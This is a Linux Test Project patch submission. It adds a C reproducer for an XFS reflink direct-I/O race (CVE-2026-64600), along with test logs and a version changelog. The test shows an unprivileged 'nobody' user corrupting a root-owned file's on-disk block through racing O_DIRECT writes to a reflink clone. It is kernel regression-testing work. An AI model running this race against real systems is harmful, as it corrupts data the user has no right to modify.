Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 15D91C56208
	for <ltp@archiver.kernel.org>; Thu,  6 Aug 2026 09:46:03 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id 3ED873E2654
	for <ltp@archiver.kernel.org>; Thu,  6 Aug 2026 11:46:01 +0200 (CEST)
Received: from in-3.smtp.seeweb.it (in-3.smtp.seeweb.it [217.194.8.3])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (secp384r1) server-digest SHA384)
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id 192653C2804
 for <ltp@lists.linux.it>; Thu,  6 Aug 2026 11:45:44 +0200 (CEST)
Received: from smtp-out2.suse.de (smtp-out2.suse.de [195.135.223.131])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by in-3.smtp.seeweb.it (Postfix) with ESMTPS id B0B871A007EA
 for <ltp@lists.linux.it>; Thu,  6 Aug 2026 11:45:42 +0200 (CEST)
Received: from imap1.dmz-prg2.suse.org (imap1.dmz-prg2.suse.org
 [IPv6:2a07:de40:b281:104:10:150:64:97])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by smtp-out2.suse.de (Postfix) with ESMTPS id 640303E1D;
 Thu,  6 Aug 2026 09:45:33 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1786009537; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=8PznhU+ZSa0mtvwE6ZdGt31K25BJR9vH4IJasmlL4f0=;
 b=DmKFlfTbK0bBo1M9dY3J3L7wWjimo48rrLTOMbFmkT/OG98/DTG7ViWwqkBrZq9TyI6Jsg
 LabdURetiXJ9DcAw8F4SKfDUB+wYOzfrKPNfLbF/U9lQBdOs6s5J2yWQcnjvW2hrEPAChh
 AOrUdE5J9Ni/8jO7jWt/zEdPgbPMnRY=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1786009537;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=8PznhU+ZSa0mtvwE6ZdGt31K25BJR9vH4IJasmlL4f0=;
 b=JcWQuW2eiWExgVU7SDh/fRzmRxmCeun+/gQidzHlu84/oY1fZP7VFcKMAX9USXU2QZkyZf
 TrHFoJT1u+SuH/AA==
Authentication-Results: smtp-out2.suse.de;
 dkim=pass header.d=suse.de header.s=susede2_rsa header.b=y6L+YMua;
 dkim=pass header.d=suse.de header.s=susede2_ed25519 header.b=RdV0apYA
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1786009533; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=8PznhU+ZSa0mtvwE6ZdGt31K25BJR9vH4IJasmlL4f0=;
 b=y6L+YMuaSkKcKgWYVRDi2Jq/RsxODDf/N8F1qTPsEUR9Rb+cue3TSyadYQ+KTUXkpKY/T6
 wHemBBqcECUzvd0VQchi0b49hA79tp4VzSxksyjs0CpifaNwHnWzg3IuqpHuKNKW/6ifAU
 ZpvS4VtP4DwyBCmHZCp9qxnNsRiYTtg=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1786009533;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=8PznhU+ZSa0mtvwE6ZdGt31K25BJR9vH4IJasmlL4f0=;
 b=RdV0apYAKREsx8aXWePFtYB9shxsKqvJeumFcGsUcbDBAL+BQ0R+CIRv/QYNlrPmyRv4ij
 qgNYXjWRmQsv2yAw==
Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id 39CA5779B6;
 Thu,  6 Aug 2026 09:45:33 +0000 (UTC)
Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
 by imap1.dmz-prg2.suse.org with ESMTPSA id UlFiDL1XdGrFOwAAD6G6ig
 (envelope-from <andrea.cervesato@suse.de>); Thu, 06 Aug 2026 09:45:33 +0000
From: Andrea Cervesato <andrea.cervesato@suse.de>
Date: Thu, 06 Aug 2026 11:45:31 +0200
MIME-Version: 1.0
Message-Id: <20260806-cve-2026-64600-v6-1-26c11513c75a@suse.com>
X-B4-Tracking: v=1; b=H4sIALpXdGoC/33OwU7DMAzG8VeZcibIcZyk5cR7TBxC7LAcWKcGo
 qGp7066C1Mndvxb+n3yRVWZi1T1sruoWVqpZTr28E87lQ7x+CG6cG+FgB4Ckk5N9BrakwfQzmb
 27DGwt6qj0yy5nK+D+7feh1K/pvnnut/Mev13qhlt9JAjGrKDY5TX+l3lOU2fal1q+Fhj1wnsO
 HogGrLfaHujrbnTtmszIkdizgHCRtNjTevnERElRRsdb7T70wPca9c1vo8C7DAEoRu9LMsvgfM
 uuqMBAAA=
X-Change-ID: 20260724-cve-2026-64600-53fd6d627d63
To: Linux Test Project <ltp@lists.linux.it>
X-Mailer: b4 0.16.0
X-Developer-Signature: v=1; a=ed25519-sha256; t=1786009533; l=11173;
 i=andrea.cervesato@suse.com; s=20251210; h=from:subject:message-id;
 bh=U0RiIJRcIh+mW6oJcMmPIKcttUxivJgyI4y2OKO6Q/M=;
 b=F2tMSSOQTIJqb5karlMGc1TvgPj4DXREG/pq4Qc85fAI/2mQLS9Y2cUnFwpOvlI79OFVZbqjI
 WdsU7NPCeeKAp19f3LFqJHJh8kfctxNdZy0ZKkKkxc2IGwPgl/hiZMq
X-Developer-Key: i=andrea.cervesato@suse.com; a=ed25519;
 pk=zKY+6GCauOiuHNZ//d8PQ/UL4jFCTKbXrzXAOQSLevI=
X-Spamd-Result: default: False [-4.51 / 50.00]; BAYES_HAM(-3.00)[100.00%];
 NEURAL_HAM_LONG(-1.00)[-1.000];
 R_DKIM_ALLOW(-0.20)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
 NEURAL_HAM_SHORT(-0.20)[-0.995]; MIME_GOOD(-0.10)[text/plain];
 MX_GOOD(-0.01)[]; RCVD_VIA_SMTP_AUTH(0.00)[];
 MIME_TRACE(0.00)[0:+];
 SPAMHAUS_XBL(0.00)[2a07:de40:b281:104:10:150:64:97:from];
 DNSWL_BLOCKED(0.00)[2a07:de40:b281:104:10:150:64:97:from];
 ARC_NA(0.00)[]; RCVD_TLS_ALL(0.00)[];
 DKIM_SIGNED(0.00)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
 FROM_EQ_ENVFROM(0.00)[]; FROM_HAS_DN(0.00)[];
 RCPT_COUNT_THREE(0.00)[3]; RCVD_COUNT_TWO(0.00)[2];
 TO_MATCH_ENVRCPT_ALL(0.00)[];
 DBL_BLOCKED_OPENRESOLVER(0.00)[suse.cz:email,suse.com:mid,suse.com:email,imap1.dmz-prg2.suse.org:rdns,imap1.dmz-prg2.suse.org:helo,suse.de:dkim];
 TO_DN_ALL(0.00)[]; DKIM_TRACE(0.00)[suse.de:+]
X-Rspamd-Queue-Id: 640303E1D
X-Rspamd-Server: rspamd2.dmz-prg2.suse.org
X-Rspamd-Action: no action
X-Virus-Scanned: clamav-milter 1.0.9 at in-3.smtp.seeweb.it
X-Virus-Status: Clean
Subject: [LTP] [PATCH v6] cve: reproducer for cve-2026-64600
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

From: Andrea Cervesato <andrea.cervesato@suse.com>

Reproducer for CVE-2026-64600 ("RefluXFS"), a race condition in the XFS
reflink copy-on-write path for direct I/O writes. The bug was introduced
in kernel v4.11 by commit 3c68d44a2b49 ("xfs: allocate direct I/O COW
blocks in iomap_begin") and fixed by commit 2f4acd0fcd86 ("xfs: resample
the data fork mapping after cycling ILOCK").

Reviewed-by: Martin Doucha <mdoucha@suse.cz>
Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
---
This reproducer has been created with the usage of Kimi K3 (as analyzer
and writer) and DeepSeek v4 Flash (Max) as reviewer, by taking the
RefluXFS technical paper as input:
https://cdn2.qualys.com/advisory/2026/07/22/RefluXFS.txt

On bugged kernel:

tst_test.c:2047: TINFO: LTP version: 20260529-131-gd12a6186b
tst_test.c:2050: TINFO: Tested kernel: 7.2.0-rc1-virtme #21 SMP PREEMPT_DYNAMIC Fri Jul 24 10:20:05 CEST 2026 x86_64
tst_kconfig.c:90: TINFO: Parsing kernel config '/lib/modules/7.2.0-rc1-virtme/build/.config'
tst_test.c:1875: TINFO: Overall timeout per run is 0h 00m 30s
cve-2026-64600.c:233: TFAIL: round 0: racing O_DIRECT write to the clone succeeded
[    1.252815] cve-2026-646
HINT: You _MAY_ be missing kernel fixes:

https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=2f4acd0fcd86

HINT: You _MAY_ be vulnerable to CVE(s):

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-64600

Summary:
passed   0
failed   1
broken   0
skipped  0
warnings 0

On patched kernel:

tst_test.c:2047: TINFO: LTP version: 20260529-131-gd12a6186b
tst_test.c:2050: TINFO: Tested kernel: 7.2.0-rc1-virtme #20 SMP PREEMPT_DYNAMIC Fri Jul 24 10:08:53 CEST 2026 x86_64
tst_kconfig.c:90: TINFO: Parsing kernel config '/lib/modules/7.2.0-rc1-virtme/build/.config'
tst_test.c:1875: TINFO: Overall timeout per run is 0h 00m 30s
[    1.665909] clocksource: Watchdog remote CPU 2 read timed out
[    8.099229] cve-2026-64600 (249) used greatest stack depth: 12216 bytes left
cve-2026-64600.c:242: TPASS: Source file survived racing O_DIRECT writers

Summary:
passed   1
failed   0
broken   0
skipped  0
warnings 0
---
Changes in v6:
- use MNTPOINT for getting filesystem block size
- Link to v5: https://lore.kernel.org/20260801-cve-2026-64600-v5-1-2b9e0d5277e4@suse.com

Changes in v5:
- fix description
- remove unused variable
- fix build in opensuse/42.2
- Link to v4: https://lore.kernel.org/20260731-cve-2026-64600-v4-1-8a222eca3a5d@suse.com

Changes in v4:
- remove pressure thread
- move cve before memory leaking CVEs
- Link to v3: https://lore.kernel.org/20260731-cve-2026-64600-v3-1-192da4ddf707@suse.com

Changes in v3:
- use fuzzy loop
- get blksize from stat()
- remove cleanup sentence in the description
- Link to v2: https://lore.kernel.org/20260724-cve-2026-64600-v2-1-c039960448f6@suse.com

Changes in v2:
- rename refluxfs.c
- ensure reflink=1 for mkfs.xfs
- remove root restore
- Link to v1: https://lore.kernel.org/20260724-cve-2026-64600-v1-1-8fa214385d2e@suse.com
---
 runtest/cve              |   1 +
 testcases/cve/.gitignore |   1 +
 testcases/cve/Makefile   |   2 +-
 testcases/cve/refluxfs.c | 227 +++++++++++++++++++++++++++++++++++++++++++++++
 4 files changed, 230 insertions(+), 1 deletion(-)

diff --git a/runtest/cve b/runtest/cve
index 99d84270b..426b203e9 100644
--- a/runtest/cve
+++ b/runtest/cve
@@ -89,6 +89,7 @@ cve-2023-0461 setsockopt10
 cve-2023-31248 nft02
 cve-2023-52879 fanotify25
 cve-2026-53362 setsockopt11
+cve-2026-64600 refluxfs
 # Tests below may cause kernel memory leak
 cve-2020-25704 perf_event_open03
 cve-2022-0185 fsconfig03
diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
index bc1af0dd2..5aa038cd5 100644
--- a/testcases/cve/.gitignore
+++ b/testcases/cve/.gitignore
@@ -16,3 +16,4 @@ tcindex01
 cve-2025-38236
 cve-2025-21756
 cve-2026-46331
+refluxfs
diff --git a/testcases/cve/Makefile b/testcases/cve/Makefile
index 98c38e908..6be4999a3 100644
--- a/testcases/cve/Makefile
+++ b/testcases/cve/Makefile
@@ -11,7 +11,7 @@ stack_clash:	CFLAGS += -fno-optimize-sibling-calls -Wno-infinite-recursion
 
 cve-2016-7042:	LDLIBS += $(KEYUTILS_LIBS)
 
-cve-2014-0196 cve-2016-7117 cve-2017-2671 cve-2017-17052 cve-2017-17053:  CFLAGS += -pthread
+cve-2014-0196 cve-2016-7117 cve-2017-2671 cve-2017-17052 cve-2017-17053 refluxfs:  CFLAGS += -pthread
 cve-2014-0196 cve-2016-7117 cve-2017-2671:  LDLIBS += -lrt
 
 ifneq ($(ANDROID),1)
diff --git a/testcases/cve/refluxfs.c b/testcases/cve/refluxfs.c
new file mode 100644
index 000000000..a7171ca3e
--- /dev/null
+++ b/testcases/cve/refluxfs.c
@@ -0,0 +1,227 @@
+// SPDX-License-Identifier: GPL-2.0-or-later
+/*
+ * Copyright (C) 2026 SUSE LLC Andrea Cervesato <andrea.cervesato@suse.com>
+ */
+
+/*\
+ * Reproducer for CVE-2026-64600 ("RefluXFS"), a race condition in the XFS
+ * reflink copy-on-write path for direct I/O writes. The bug was introduced
+ * in kernel v4.11 by commit 3c68d44a2b49 ("xfs: allocate direct I/O COW
+ * blocks in iomap_begin") and fixed by commit 2f4acd0fcd86 ("xfs: resample
+ * the data fork mapping after cycling ILOCK").
+ *
+ * When an :manpage:`ioctl(2)` FICLONE clone is written via ``O_DIRECT``,
+ * ``xfs_direct_write_iomap_begin()`` samples the clone's data-fork mapping
+ * under ILOCK and calls ``xfs_reflink_allocate_cow()``, which drops the
+ * ILOCK to allocate a transaction and then re-checks whether the *stale*
+ * physical block is still shared. If a second racing ``O_DIRECT`` writer
+ * completes a full copy-on-write cycle inside that lock-drop window, the
+ * old shared block's refcount drops to one, the first writer takes the
+ * "not shared, write in place" branch, and its write is submitted to the
+ * physical block that now belongs only to the reflink source file,
+ * corrupting it on disk.
+ *
+ * [Algorithm]
+ *
+ * - Create a root-owned target file on a reflink-enabled XFS and fill
+ *   its first block with a known pattern
+ * - Drop privileges to the unprivileged user ``nobody``
+ * - Positive control: a single ``O_DIRECT`` write to a fresh clone must
+ *   be copy-on-written and leave the target untouched
+ * - Each round: reflink-clone the target into a scratch clone file, each
+ *   issuing one block-sized ``O_DIRECT`` :manpage:`pwrite(2)` at offset 0
+ *   of the clone
+ * - After each round, read back the target's first block bypassing the
+ *   page cache (``O_DIRECT``): any byte differing from the original
+ *   pattern means a racing write refluxed into the source file and the
+ *   kernel is vulnerable
+ */
+
+#include <pwd.h>
+
+#include "tst_test.h"
+#include "tst_safe_prw.h"
+#include "lapi/ficlone.h"
+#include "tst_fuzzy_sync.h"
+
+#define MNTPOINT	"mnt"
+#define WORKDIR		MNTPOINT "/work"
+#define TARGET		WORKDIR "/target"
+#define CLONE		WORKDIR "/clone"
+
+static char *tbuf, *wbuf, *rbuf;
+
+static int target_fd = -1;
+static int target_dio_fd = -1;
+static int clone_fd = -1;
+
+static int blksize;
+
+static struct tst_fzsync_pair pair;
+
+static void *writer_b(void *arg)
+{
+	int fd;
+
+	(void)arg;
+
+	while (tst_fzsync_run_b(&pair)) {
+		tst_fzsync_wait_b(&pair);
+
+		fd = SAFE_OPEN(CLONE, O_RDWR | O_DIRECT);
+
+		tst_fzsync_start_race_b(&pair);
+		SAFE_PWRITE(1, fd, wbuf, blksize, 0);
+		tst_fzsync_end_race_b(&pair);
+
+		SAFE_CLOSE(fd);
+	}
+
+	return NULL;
+}
+
+static void drop_privileges(void)
+{
+	struct passwd *pw;
+
+	pw = SAFE_GETPWNAM("nobody");
+	SAFE_SETEGID(pw->pw_gid);
+	SAFE_SETEUID(pw->pw_uid);
+}
+
+static void setup(void)
+{
+	int probe_fd, probe_dio_fd;
+	struct stat sb;
+
+	SAFE_STAT(MNTPOINT, &sb);
+	blksize = sb.st_blksize;
+
+	tbuf = SAFE_MEMALIGN(blksize, blksize);
+	wbuf = SAFE_MEMALIGN(blksize, blksize);
+	rbuf = SAFE_MEMALIGN(blksize, blksize);
+
+	memset(tbuf, 'A', blksize);
+	memset(wbuf, 'X', blksize);
+	memset(rbuf, 0, blksize);
+
+	SAFE_MKDIR(WORKDIR, 0700);
+	SAFE_CHMOD(WORKDIR, 0777);
+
+	target_fd = SAFE_OPEN(TARGET, O_RDWR | O_CREAT | O_TRUNC, 0644);
+	SAFE_WRITE(1, target_fd, tbuf, blksize);
+	SAFE_FSYNC(target_fd);
+	SAFE_CLOSE(target_fd);
+
+	drop_privileges();
+
+	target_fd = SAFE_OPEN(TARGET, O_RDONLY);
+	probe_fd = SAFE_OPEN(CLONE, O_RDWR | O_CREAT | O_TRUNC, 0600);
+
+	TEST(ioctl(probe_fd, FICLONE, target_fd));
+	if (TST_RET == -1) {
+		if (TST_ERR == EOPNOTSUPP || TST_ERR == EINVAL || TST_ERR == ENOSYS) {
+			tst_brk(TCONF, "reflink clones not supported: %s",
+				tst_strerrno(TST_ERR));
+		}
+
+		tst_brk(TBROK | TTERRNO, "ioctl(FICLONE) failed");
+	}
+
+	probe_dio_fd = SAFE_OPEN(CLONE, O_RDWR | O_DIRECT);
+	SAFE_PWRITE(1, probe_dio_fd, wbuf, blksize, 0);
+	SAFE_CLOSE(probe_dio_fd);
+	SAFE_CLOSE(probe_fd);
+
+	/* The racy write bypasses the target's page cache, so must the read */
+	target_dio_fd = SAFE_OPEN(TARGET, O_RDONLY | O_DIRECT);
+
+	SAFE_PREAD(1, target_dio_fd, rbuf, blksize, 0);
+	if (memcmp(rbuf, tbuf, blksize))
+		tst_brk(TBROK, "Source file modified by a single O_DIRECT write to the clone");
+
+	tst_fzsync_pair_init(&pair);
+}
+
+static void run(void)
+{
+	int corrupted = 0;
+
+	tst_fzsync_pair_reset(&pair, writer_b);
+
+	while (tst_fzsync_run_a(&pair)) {
+		clone_fd = SAFE_OPEN(CLONE, O_RDWR | O_CREAT | O_TRUNC, 0600);
+
+		/*
+		 * target_fd is O_RDONLY opened as "nobody".  FICLONE
+		 * checks inode permission against our effective UID.
+		 */
+		SAFE_IOCTL(clone_fd, FICLONE, target_fd);
+		SAFE_CLOSE(clone_fd);
+
+		clone_fd = SAFE_OPEN(CLONE, O_RDWR | O_DIRECT);
+
+		tst_fzsync_wait_a(&pair);
+
+		tst_fzsync_start_race_a(&pair);
+		SAFE_PWRITE(1, clone_fd, wbuf, blksize, 0);
+		tst_fzsync_end_race_a(&pair);
+
+		SAFE_PREAD(1, target_dio_fd, rbuf, blksize, 0);
+		SAFE_CLOSE(clone_fd);
+
+		if (memcmp(rbuf, tbuf, blksize)) {
+			tst_res(TFAIL, "racing O_DIRECT write to the clone succeeded at loop %d", pair.exec_loop);
+			corrupted = 1;
+			break;
+		}
+	}
+
+	if (!corrupted)
+		tst_res(TPASS, "Source file survived racing O_DIRECT writers");
+}
+
+static void cleanup(void)
+{
+	tst_fzsync_pair_cleanup(&pair);
+
+	if (target_dio_fd != -1)
+		SAFE_CLOSE(target_dio_fd);
+
+	if (target_fd != -1)
+		SAFE_CLOSE(target_fd);
+
+	if (clone_fd != -1)
+		SAFE_CLOSE(clone_fd);
+
+	free(tbuf);
+	free(wbuf);
+	free(rbuf);
+}
+
+static struct tst_test test = {
+	.test_all = run,
+	.setup = setup,
+	.cleanup = cleanup,
+	.runtime = 180,
+	.needs_root = 1,
+	.mount_device = 1,
+	.mntpoint = MNTPOINT,
+	.filesystems = (struct tst_fs []) {
+		{
+			.type = "xfs",
+			.min_kver = "4.16",
+			.mkfs_ver = "mkfs.xfs >= 1.5.0",
+			.mkfs_opts = (const char *const []) {
+				"-m", "reflink=1",
+				NULL
+			},
+		},
+		{}
+	},
+	.tags = (const struct tst_tag[]) {
+		{"linux-git", "2f4acd0fcd86"},
+		{"CVE", "2026-64600"},
+		{}
+	},
+};

---
base-commit: 12fcadf63a99fc4bec76f9b4715cda626256562f
change-id: 20260724-cve-2026-64600-53fd6d627d63

Best regards,
--  
Andrea Cervesato <andrea.cervesato@suse.com>


-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
